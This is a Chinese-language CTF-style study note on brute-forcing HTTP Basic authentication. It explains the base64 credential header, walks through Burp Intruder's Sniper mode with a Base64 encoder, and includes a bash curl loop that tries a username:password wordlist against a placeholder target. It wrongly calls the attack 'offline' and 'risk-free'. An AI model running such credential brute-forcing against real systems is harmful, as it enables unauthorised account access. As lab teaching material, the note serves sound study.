---
title: HTTP Basic 认证爆破
category: 信息收集/爆破
tags: [HTTPBasic, WWW-Authenticate, 401, Burp, 狙击枪, 自定义迭代器, base64]
order: 5
---

## 一句话概括

看到 **`401` + `WWW-Authenticate: Basic`** 就说明目标用的是 HTTP Basic 认证 —— 用户名密码被 **`base64(用户名:密码)`** 放在 `Authorization` 头里，**可以被无风险地离线式爆破**：构造编码后的字典，逐条发请求，**找响应长度/内容不一样的那条**就是正确答案。

## 原理

### 1. 先分清两种「弹窗」

![页面表单登录与浏览器弹窗的区别](../_assets/brute-1.png)

网站要你登录，有**两种完全不同的弹窗**：

| 类型 | 长什么样 | 本质 |
| :--- | :--- | :--- |
| **页面表单登录** | 网页里有输入框（像后台登录页，让你输用户名和密码） | 网站**自己写的**登录页面，数据发给自己服务器 |
| **浏览器弹窗** | 浏览器**自带**的小框（一个用户、一个密码框，点取消是红色的 ×） | **服务器要求的**，浏览器原生弹窗，和网页本身无关 |

HTTP Basic 认证就是第二种：你在浏览器地址栏访问某个受保护的 URL 时，服务器不返回页面，而是告诉浏览器「这里需要认证」，浏览器就弹出一个原生小窗让你输入。

### 2. 认证流程图

```text
浏览器                                    服务器
   │  GET /admin/  ──────────────────────►  │
   │  ◄── 401 Unauthorized ───────────────  │
   │      WWW-Authenticate: Basic realm="x" │
   │                                        │
   │  （浏览器弹出原生小窗，用户输入 admin/123）
   │                                        │
   │  GET /admin/                           │
   │  Authorization: Basic YWRtaW46MTIz ──►  │   base64("admin:123") = YWRtaW46MTIz
   │  ◄── 200 OK ──────────────────────────  │
```

### 3. 值的本质：base64，不是加密

```text
admin:123  ──base64──►  YWRtaW46MTIz
```

- **`base64` 是编码不是加密** —— 没有任何密钥，任何人都能解回来；
- 因此凭据相当于**在链路上近乎明文**，只要抓到包就能立刻还原；
- 也正因为它只是编码，**爆破时可以本地构造**：把字典里的 `用户名:密码` 拼好、编码好，直接塞进 `Authorization` 头即可。

### 4. 弹窗不只有 Basic 一种

![WWW-Authenticate 头里的值区分认证类型](../_assets/brute-2.png)

`WWW-Authenticate` 头里的**值**能区分认证类型：

| 值 | 类型 | 特点 |
| :--- | :--- | :--- |
| `Basic` | HTTP Basic | **最老，明文 base64，可爆破** |
| `Digest` | HTTP Digest | 加盐哈希，较安全，较少见 |
| `Bearer` / `Negotiate` | Token / 集成认证 | 现代接口用的 |

**做题 99% 遇到的是 `Basic`**，因为它实现简单、密码能解。你只要看到 `Basic` 就想到爆破那条思路。

### 5. 结论（原笔记）

> 看到 **401 + WWW-Authenticate: Basic** = HTTP Basic 认证 → 密码是 **`base64(用户名:密码)`** → 可以用**自定义迭代器**爆破，**找响应长度不同的那条**。

> **为什么是「响应长度不同」而不是「状态码不同」**：认证失败时服务器**仍然返回 401**，状态码一模一样；但成功那条返回的是真正的页面（长度明显不同）。所以判据要选**长度**或**响应体指纹**。

## 本题情景与解题手法

### 题目形态

访问目标页面，浏览器弹出一个**原生的用户名/密码小窗**（不是网页表单）。抓包看到：

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted"
```

### 第一步：确认是 Basic 而不是 Digest

```http
GET / HTTP/1.1
Host: 靶机地址
```

看 `WWW-Authenticate` 的值：

- `Basic ...` → 走本文的 base64 爆破；
- `Digest ...` → 哈希加盐，不能简单爆破，需要另找路子。

### 第二步：抓一次真实的认证请求，看头的格式

在弹窗里随便输一组账号密码（如 `a` / `b`），抓下请求：

```http
GET / HTTP/1.1
Host: 靶机地址
Authorization: Basic YTpi
```

其中 `YTpi` 就是 `base64("a:b")`。

### 第三步：在 Burp 里配置爆破

**用狙击枪（Sniper），自定义的编码器即可。**

关键操作：

1. 把 `Authorization: Basic §YTpi§` 里的那一段 base64 **设成 payload 位置**（前后加 `§`）；
2. **Attack type 选 Sniper（狙击枪）** —— 1 个 payload 位置，逐个替换；
3. 在 **Payloads → Payload processing** 里加一条 **Base64-encode**（自定义编码器），并设置前缀/拼接逻辑，让最终发出的值是 `base64(用户名:密码)`；
4. 字典用「用户名:密码」的组合（常见用户名 × 常见密码）；
5. **看结果排序：按 Length 排序，最长/最短那条就是命中**。

**Burp 四种攻击模式对照：**

![Burp Intruder 四种攻击模式](../_assets/brute-3.png)

| 攻击模式 | Payload Set 数量 | 组合逻辑 | 测试结果示例 |
| :--- | :--- | :--- | :--- |
| **Sniper（狙击枪）** | 1 个 | 逐个位置单独替换，其他位置保持原始值 | `11:password0000 → 22:password0…` |
| **Battering ram（攻城锤）** | 1 个 | 所有位置同时使用同一个 Payload 值替换 | `11:11 → 22:22 → 33:33 → …` |
| **Pitchfork（干草叉）** | 多个（数量需一致） | 顺序一对一配对（第 1 个字典的第 1 项配第 2 个字典的第 1 项） | `11:aa → 22:bb → 33:cc` |
| **Cluster bomb（集束炸弹）** | 多个（无限制） | 全排列组合（每个字典的值互相交叉尝试） | `11:aa → 11:bb → 11:cc → 22:aa → …` |

> **这里的取舍**：Basic 认证的用户名和密码通常**在同一个 payload 位置**（因为最终要拼成一个 `user:pass` 再编码），所以 **Sniper 就够**。如果题目把用户名和密码放在两个独立的位置、且需要分别遍历，才考虑 Pitchfork / Cluster bomb。

### 第四步：确认命中

命中那条请求的响应：

- 状态码变 `200`；
- **响应长度明显长于其它条**；
- 内容不再是 401 页面。

把它 Send to Repeater 验证一下，然后用解码后的账号密码登录。

### 解题手法一句话总结

> **原生弹窗 + `401` + `WWW-Authenticate: Basic`** → 凭据就是 `base64(用户名:密码)` → Burp 里把 base64 段设为 payload 位置 → **Sniper + 自定义 Base64 编码器** → 跑字典 → **按响应长度排序，挑不一样的那条**。

## 利用条件

1. **认证方式是 Basic**：`WWW-Authenticate: Basic`（Digest 不适用）；
2. **密码强度低**：字典能覆盖，否则爆破无意义；
3. **没有次数限制**：没有验证码、没有登录失败锁定、没有 IP 封禁；
4. **能区分成功与失败**：靠响应长度、内容、跳转等差异；
5. **速度足够**：Basic 每请求都是一次完整的 HTTP 往返，线程数要开够，否则大字典跑不完。

## Payload 速查

| 目的 | 做法 |
| :--- | :--- |
| 手工试一组 | `Authorization: Basic ` + `base64(user:pass)` |
| 本地生成 base64 | `echo -n "admin:123" \| base64` |
| 用 curl 直接带认证 | `curl -u admin:123 http://靶机地址/` |
| 爆破（Sniper + Base64 编码器） | 把 `Authorization: Basic §xxx§` 设为 payload 位置 |
| 判据 | **按 Length 排序**，取异常项 |

## 完整示例

**1. 确认认证类型**

```bash
curl -i http://靶机地址/
```

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted"
```

**2. 手工构造一个认证头**

```bash
echo -n "admin:123" | base64
# YWRtaW46MTIz
```

```http
GET / HTTP/1.1
Host: 靶机地址
Authorization: Basic YWRtaW46MTIz
```

**3. 用 curl 批量试（脚本化思路）**

```bash
while IFS=: read -r u p; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$u:$p" http://靶机地址/)
  echo "$code  $u:$p"
done < 字典.txt
```

**4. 看结果**

```text
401  admin:123456
401  root:toor
200  admin:admin123      ← 命中
401  test:test
```

> 脚本里若只看状态码分不出来（全是 401 或全是 200），就改成比较**响应字节数**：`curl -s -u "$u:$p" http://靶机地址/ | wc -c`。

## 踩坑与备注

- **判据要挑稳的**：状态码常常不变，**响应长度/内容**才是可靠的差异点。原笔记的结论「找响应长度不同的那条」就是针对这一点。
- **`base64(用户名:密码)` 中间只有一个冒号**，别写成分号或空格；`base64 -w0`（去掉换行）或 `echo -n`（不追加换行）是关键，多一个换行编码结果就完全不同。
- **自定义迭代器**是指 Burp 的 Payload processing 里加 Base64 编码步骤 —— 不要手写已经编码好的字典再编码一次，会导致双重编码。
- **注意 Digest 的干扰**：如果响应头是 `WWW-Authenticate: Digest ...`，Burp 那种 base64 爆破直接无效，别浪费时间。
- **原笔记此处有三张截图**（`image-20260911150115099.png`、`image-20260911150248719.png`、`image-20260911163730313.png`），内容已还原为上面的对比表与 Burp 四种模式表；对应的真实截图见 `../../_assets/brute-1.png`、`../../_assets/brute-2.png`、`../../_assets/brute-3.png`。
